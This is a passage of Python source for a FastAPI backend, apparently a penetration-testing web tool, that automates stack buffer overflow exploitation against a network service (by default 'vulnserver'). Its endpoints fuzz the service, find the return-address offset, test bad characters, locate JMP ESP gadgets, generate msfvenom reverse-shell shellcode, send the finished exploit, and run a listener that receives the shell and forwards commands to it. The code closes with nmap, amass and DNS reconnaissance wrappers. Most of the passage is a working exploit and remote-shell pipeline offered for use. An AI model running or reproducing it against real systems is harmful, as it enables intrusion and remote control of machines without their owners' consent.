    payload_type: str  = "linux/x86/shell_reverse_tcp"
    shellcode:    str  = ""


def _bof_parse_target(target: str):
    parts = target.strip().replace("tcp://","").replace("http://","").split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 9999
    return host, port


def _bof_send(host, port, data: bytes, timeout=5) -> bool:
    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.recv(1024)
        s.send(data + b"\r\n")
        try: s.recv(1024)
        except: pass
        s.close()
        return True
    except Exception:
        return False


def _bof_parse_bad_chars(bad_chars: str) -> list:
    hexes = re.findall(r'[0-9a-fA-F]{2}', bad_chars)
    return [int(h,16) for h in hexes] if hexes else [0x00]

async def _bof_restart_server(binary: str, port: int):
    """Kill existing server and restart it in background, wait until ready."""
    subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
    await asyncio.sleep(0.4)
    proc = await asyncio.create_subprocess_exec(
        binary,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    # Wait until "listening" appears in output
    for _ in range(30):
        await asyncio.sleep(0.1)
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=0.2)
            if b"listening" in line.lower() or b"port" in line.lower():
                break
        except asyncio.TimeoutError:
            pass
    await asyncio.sleep(0.2)
    return proc


@app.post("/api/bof/fuzz")
async def bof_fuzz(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    step   = max(10, min(req.fuzz_step, 500))
    size   = step
    crash_at = None
    for _ in range(200):
        payload = prefix + b"A" * size
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.recv(1024)
            s.send(payload + b"\r\n")
            try: s.recv(1024)
            except: pass
            s.close()
        except Exception:
            crash_at = size
            break
        _time.sleep(0.3)
        size += step
    if crash_at:
        return {"crash_at":crash_at,"recommended_pattern_size":crash_at+400,"message":f"Server crashed at {crash_at} bytes"}
    return {"crash_at":None,"message":"No crash detected — check target is running"}


@app.post("/api/bof/offset")
async def bof_offset(req: BOFRequest, user=Depends(verify_token)):
    host, port = _bof_parse_target(req.target)
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    size   = req.pattern_size or 500

    # Generate pattern
    result = await run_tool(["msf-pattern_create", "-l", str(size)], timeout=15)
    pattern = result.get("output", "").strip()
    if not pattern:
        return {"error": "msf-pattern_create failed"}

    binary = req.binary_path or "/home/kali/vulnserver"
    eip_value = req.eip_value.strip() if req.eip_value else None
    offset = None
    gdb_out = ""

    # Auto-detect EIP using GDB if binary is local
    if os.path.exists(binary) and not eip_value:
        try:
            # Kill any existing vulnserver on that port
            subprocess.run(["pkill", "-f", os.path.basename(binary)], capture_output=True)
            await asyncio.sleep(0.5)

            # Start vulnserver under GDB
            gdb_proc = await asyncio.create_subprocess_exec(
                "gdb", "-q", "--batch",
                "-ex", "set confirm off",
                "-ex", "set pagination off",
                "-ex", "handle SIGSEGV stop print",
                "-ex", "run",
                "-ex", "info registers eip",
                "-ex", "quit",
                binary,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            # Read output line by line until server is ready
            server_ready = False
            for _ in range(30):  # wait up to 3s
                await asyncio.sleep(0.1)
                try:
                    line = await asyncio.wait_for(
                        gdb_proc.stdout.readline(), timeout=0.2)
                    gdb_out += line.decode("utf-8", errors="replace")
                    if b"listening" in line.lower() or b"port" in line.lower():
                        server_ready = True
                        break
                except asyncio.TimeoutError:
                    pass

            await asyncio.sleep(0.5)

            # Send the pattern
            _bof_send(host, port, prefix + pattern.encode("latin-1"))
            await asyncio.sleep(1.5)

            # Read remaining GDB output (registers after crash)
            try:
                remaining, _ = await asyncio.wait_for(
                    gdb_proc.communicate(), timeout=6)
                gdb_out += remaining.decode("utf-8", errors="replace")
            except asyncio.TimeoutError:
                gdb_proc.kill()

            # Parse EIP
            em = re.search(r"eip\s+0x([0-9a-fA-F]+)", gdb_out, re.IGNORECASE)
            if not em:
                # Also try crash address line: "0x41386541 in ?? ()"
                em = re.search(r"^(0x[0-9a-fA-F]+)\s+in\s+\?\?", gdb_out, re.IGNORECASE | re.MULTILINE)
                if em:
                    eip_value = em.group(1).replace("0x","").upper()
                else:
                    eip_value = None
            else:
                eip_value = em.group(1).upper()

        except Exception as ex:
            gdb_out += f"\n[error] {ex}"

    # Find offset if we have EIP
    if eip_value:
        off_result = await run_tool(
            ["msf-pattern_offset", "-l", str(size), "-q", eip_value], timeout=15)
        m = re.search(r"Exact match at offset (\d+)", off_result.get("output", ""))
        if m: offset = int(m.group(1))

    if not eip_value:
        # Last resort: send pattern and wait for user to enter EIP manually
        _bof_send(host, port, prefix + pattern.encode("latin-1"))

    return {
        "pattern_size": size,
        "eip_value": eip_value or "not captured — enter manually",
        "offset": offset,
        "gdb_log": gdb_out[-500:] if gdb_out else "",
        "message": f"✅ Offset = {offset} bytes  |  EIP = {eip_value}" if offset else "Pattern sent — enter EIP value in the field above to get offset"
    }


@app.post("/api/bof/eip_control")
async def bof_eip_control(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    payload  = prefix + b"A"*req.offset + b"BBBB" + b"C"*max(0,500-req.offset-4)
    _bof_send(host, port, payload)
    return {"offset":req.offset,"payload_size":len(payload),"eip_overwrite":"BBBB (0x42424242)","sent":True,"message":f"Sent {len(payload)} bytes — EIP should show 42424242 in debugger"}


@app.post("/api/bof/badchars")
async def bof_badchars(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset:
        return {"error":"Offset required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    known_bad = _bof_parse_bad_chars(req.bad_chars)
    all_bytes = bytearray([b for b in range(1,256) if b not in known_bad])
    payload  = prefix + b"A"*req.offset + b"BBBB" + bytes(all_bytes) + b"C"*100
    sent = _bof_send(host, port, payload)
    excluded = [f"\\x{b:02x}" for b in known_bad]
    return {"sent":sent,"bytes_tested":len(all_bytes),"excluded":excluded,"payload_size":len(payload),"message":f"Sent {len(all_bytes)} bytes — all sequential = only \\x00 is bad"}


def _elf_find_jmp_esp(binary_path: str, bad_bytes: list, load_base: int = 0) -> list:
    """Pure Python: scan ELF binary for JMP ESP (\\xff\\xe4) — instant, no external tools."""
    gadgets = []
    try:
        with open(binary_path, 'rb') as f:
            data = f.read()
        if len(data) < 52 or data[:4] != b'\x7fELF' or data[4] != 1:
            return []  # not 32-bit ELF
        e_phoff     = _struct.unpack_from('<I', data, 28)[0]
        e_phentsize = _struct.unpack_from('<H', data, 42)[0]
        e_phnum     = _struct.unpack_from('<H', data, 44)[0]
        JMP_ESP = b'\xff\xe4'
        for i in range(e_phnum):
            h = e_phoff + i * e_phentsize
            if h + 32 > len(data):
                break
            p_type  = _struct.unpack_from('<I', data, h)[0]
            p_flags = _struct.unpack_from('<I', data, h + 24)[0]
            p_off   = _struct.unpack_from('<I', data, h + 4)[0]
            p_vaddr = _struct.unpack_from('<I', data, h + 8)[0]
            p_fsz   = _struct.unpack_from('<I', data, h + 16)[0]
            if p_type != 1 or not (p_flags & 1):   # PT_LOAD + PF_X only
                continue
            seg = data[p_off:p_off + p_fsz]
            idx = 0
            while True:
                pos = seg.find(JMP_ESP, idx)
                if pos == -1:
                    break
                vaddr  = load_base + p_vaddr + pos
                vbytes = list(_struct.pack('<I', vaddr))
                if not any(b in bad_bytes for b in vbytes):
                    le = "".join(f"\\x{b:02x}" for b in vbytes)
                    gadgets.append({"address": f"0x{vaddr:08x}", "gadget": "jmp esp", "little_endian": le})
                idx = pos + 1
    except Exception:
        pass
    return gadgets


@app.post("/api/bof/jmpesp")
async def bof_jmpesp(req: BOFRequest, user=Depends(verify_token)):
    binary    = req.binary_path or "/home/kali/vulnserver"
    bad_bytes = _bof_parse_bad_chars(req.bad_chars)

    # Check ASLR
    try:
        with open("/proc/sys/kernel/randomize_va_space") as _f:
            _aslr = _f.read().strip()
    except Exception:
        _aslr = "?"

    # Step 1 — scan primary binary (instant ELF scan, no external tools)
    gadgets = _elf_find_jmp_esp(binary, bad_bytes, load_base=0)
    source  = binary

    # Step 2 — fallback: find libc via ldd, get load base, scan libc
    if not gadgets:
        try:
            ldd_r = subprocess.run(["ldd", binary], capture_output=True, text=True, timeout=5)
            m = re.search(r'libc[^\s]*\s+=>\s+(\S+)\s+\(0x([0-9a-fA-F]+)\)', ldd_r.stdout)
            if m:
                lib_path = m.group(1)
                lib_base = int(m.group(2), 16)
                gadgets  = _elf_find_jmp_esp(lib_path, bad_bytes, load_base=lib_base)
                if gadgets:
                    source = lib_path
        except Exception:
            pass

    # Step 3 — scan known 32-bit libc paths without load_base (ASLR must be 0)
    if not gadgets:
        for lib in ["/usr/lib32/libc.so.6", "/lib32/libc.so.6",
                    "/usr/lib/i386-linux-gnu/libc.so.6"]:
            if os.path.exists(lib):
                gadgets = _elf_find_jmp_esp(lib, bad_bytes, load_base=0)
                if gadgets:
                    source = lib
                    break

    if not gadgets:
        return {"gadgets": [], "address": "", "aslr": _aslr, "message":
                "No clean JMP ESP found. Ensure ASLR=0: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"}

    best = gadgets[0]
    return {
        "gadgets":      gadgets[:10],   # return top 10 clean gadgets
        "recommended":  best,
        "address":      best["address"],
        "little_endian":best["little_endian"],
        "source":       source,
        "aslr":         _aslr,
        "message":      f"Found {len(gadgets)} clean JMP ESP gadget(s) in {os.path.basename(source)} (no bad chars in address). Use: {best['address']} → {best['little_endian']}"
    }


@app.post("/api/bof/shellcode")
async def bof_shellcode(req: BOFRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error":"LHOST required"}
    bad_bytes = "".join([f"\\x{b:02x}" for b in _bof_parse_bad_chars(req.bad_chars)])
    cmd = ["msfvenom","-p",req.payload_type,f"LHOST={req.lhost}",f"LPORT={req.lport}","EXITFUNC=thread","-b",bad_bytes,"-f","python","-v","shellcode"]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output","")
    lines = [l for l in out.splitlines() if "shellcode" in l and ("b\"" in l or "b'" in l)]
    shellcode_py = "\n".join(lines)
    raw = re.findall(r'b"([^"]+)"', shellcode_py)
    raw_bytes = "".join(raw)
    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
    size = int(size_m.group(1)) if size_m else None
    return {"payload":req.payload_type,"lhost":req.lhost,"lport":req.lport,"bad_chars":bad_bytes,"size":size,"shellcode_python":shellcode_py,"shellcode_bytes":raw_bytes,"message":f"Shellcode generated: {size} bytes"}


@app.post("/api/bof/exploit")
async def bof_exploit(req: BOFRequest, user=Depends(verify_token)):
    if not req.offset: return {"error":"Offset required"}
    if not req.jmp_esp: return {"error":"JMP ESP address required"}
    if not req.shellcode: return {"error":"Shellcode required"}
    host, port = _bof_parse_target(req.target)
    binary = req.binary_path or "/home/kali/vulnserver"
    prefix = req.prefix.encode("latin-1") if req.prefix else b""
    if os.path.exists(binary):
        await _bof_restart_server(binary, port)
    addr_int = int(req.jmp_esp.strip(),16)
    retn = _struct.pack("<I",addr_int)
    hex_bytes = re.findall(r'\\x([0-9a-fA-F]{2})', req.shellcode)
    sc = bytes([int(h,16) for h in hex_bytes])
    if not sc: return {"error":"Could not parse shellcode"}
    payload = prefix + b"A"*req.offset + retn + b"\x90"*16 + sc
    _bof_send(host, port, payload, timeout=6)
    return {"sent":True,"payload_size":len(payload),"offset":req.offset,"retn":req.jmp_esp,"shellcode_size":len(sc),"message":f"✅ Exploit sent!"}


# ── INTEGRATED SHELL LISTENER ────────────────────────────────
class _ShellSession:
    def __init__(self, lid, lport):
        self.lid    = lid
        self.lport  = lport
        self.output = []
        self.status = "waiting"   # waiting | connected | closed
        self.writer = None
        self.server = None

SHELL_SESSIONS: dict = {}

async def _shell_handler(reader, writer, lid):
    addr = writer.get_extra_info("peername")
    s = SHELL_SESSIONS.get(lid)
    if not s: return
    s.status = "connected"
    s.writer = writer
    s.output.append(f"[+] Shell connected from {addr[0]}:{addr[1]}\n")
    try:
        while True:
            data = await asyncio.wait_for(reader.read(4096), timeout=300)
            if not data: break
            s.output.append(data.decode("utf-8", errors="replace"))
    except Exception:
        pass
    s.status = "closed"
    try: writer.close()
    except: pass

@app.post("/api/bof/shell/start")
async def bof_shell_start(req: BOFRequest, user=Depends(verify_token)):
    lport = req.lport or 4444
    lid   = f"shell_{lport}"
    # Close existing session on same port
    if lid in SHELL_SESSIONS:
        try:
            if SHELL_SESSIONS[lid].server: SHELL_SESSIONS[lid].server.close()
            if SHELL_SESSIONS[lid].writer: SHELL_SESSIONS[lid].writer.close()
        except: pass
    # Kill any existing process holding the port (e.g. leftover nc)
    subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
    await asyncio.sleep(0.5)
    session = _ShellSession(lid, lport)
    SHELL_SESSIONS[lid] = session
    try:
        server = await asyncio.start_server(
            lambda r, w: _shell_handler(r, w, lid), "0.0.0.0", lport,
            reuse_port=True)
        session.server = server
        asyncio.create_task(server.serve_forever())
        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
                "message": f"Listener ready on port {lport} — send exploit now"}
    except Exception as e:
        return {"error": str(e), "lid": lid, "ok": False}

@app.get("/api/bof/shell/{lid}/output")
async def bof_shell_output(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s: return {"output": "", "status": "not_found"}
    out = "".join(s.output); s.output = []
    return {"output": out, "status": s.status}

@app.post("/api/bof/shell/{lid}/cmd")
async def bof_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
    s = SHELL_SESSIONS.get(lid)
    if not s or not s.writer: return {"error": "No shell connected"}
    try:
        cmd = body.get("cmd", "")
        s.writer.write((cmd + "\n").encode())
        await s.writer.drain()
        return {"sent": True}
    except Exception as e:
        return {"error": str(e)}

@app.post("/api/bof/shell/{lid}/stop")
async def bof_shell_stop(lid: str, user=Depends(verify_token)):
    s = SHELL_SESSIONS.pop(lid, None)
    if s:
        try:
            if s.server: s.server.close()
            if s.writer: s.writer.close()
        except: pass
    return {"stopped": True}

@app.post("/api/recon/dnsrecon")
async def recon_dnsrecon(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["dnsrecon", "-d", host, "-t", "std"], timeout=60)
    out = result.get("output","")
    records = []
    for line in out.splitlines():
        m = re.match(r'\[\*\]\s+(A|AAAA|NS|MX|TXT|CNAME|SOA|PTR|SRV)\s+(\S+)\s+(.*)', line.strip())
        if m:
            records.append({"type": m.group(1), "name": m.group(2), "address": m.group(3).strip()})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "dnsrecon", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"dnsrecon","records":records,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/crtsh")
async def recon_crtsh(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    subdomains = []
    try:
        async with httpx.AsyncClient(timeout=30) as client:
            r = await client.get(f"https://crt.sh/?q=%.{host}&output=json")
            if r.status_code == 200:
                for entry in r.json():
                    for sub in entry.get("name_value","").split("\n"):
                        sub = sub.strip().lstrip("*.")
                        if sub and sub not in subdomains:
                            subdomains.append(sub)
    except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "crtsh", req.target, {"output":str(subdomains)})
    return {"scan_id":scan_id,"target":req.target,"tool":"crtsh","subdomains":subdomains,"total":len(subdomains),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/amass")
async def recon_amass(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["amass", "enum", "-passive", "-d", host, "-timeout", "2"], timeout=150)
    out = result.get("output","")
    subdomains = list(dict.fromkeys([l.strip() for l in out.splitlines() if l.strip() and "." in l]))
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "amass", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"amass","subdomains":subdomains,"total":len(subdomains),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/harvester")
async def recon_harvester(req: ScanRequest, user=Depends(verify_token)):
    return await recon_theharvester(req, user)

@app.post("/api/recon/services")
async def recon_services(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-sV", "--version-intensity", "5", "--open", "-T4", host], timeout=180)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)", line.strip())
        if m: ports.append({"port":int(m.group(1)),"proto":m.group(2),"service":m.group(3),"version":m.group(4).strip()})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "services", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"services","ports":ports,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/os")
async def recon_os(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-O", "--osscan-guess", "-T4", host], timeout=120)
    out = result.get("output","")
    os_match = next((l.split(":",1)[-1].strip() for l in out.splitlines() if "OS details:" in l or "Aggressive OS guesses:" in l), None)
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "os", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"os","os":os_match,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/banner")
async def recon_banner(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "--script=banner", "-p", "21,22,25,80,443,8080,3306,3389", host], timeout=120)
    out = result.get("output","")
    banners = {}
    cur = None
    for line in out.splitlines():
        pm = re.match(r"(\d+)/tcp", line.strip())
        if pm: cur = pm.group(1)
        bm = re.match(r"\|\s+banner:\s*(.*)", line.strip())
        if bm and cur: banners[cur] = bm.group(1).strip()
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "banner", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"banner","banners":banners,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}
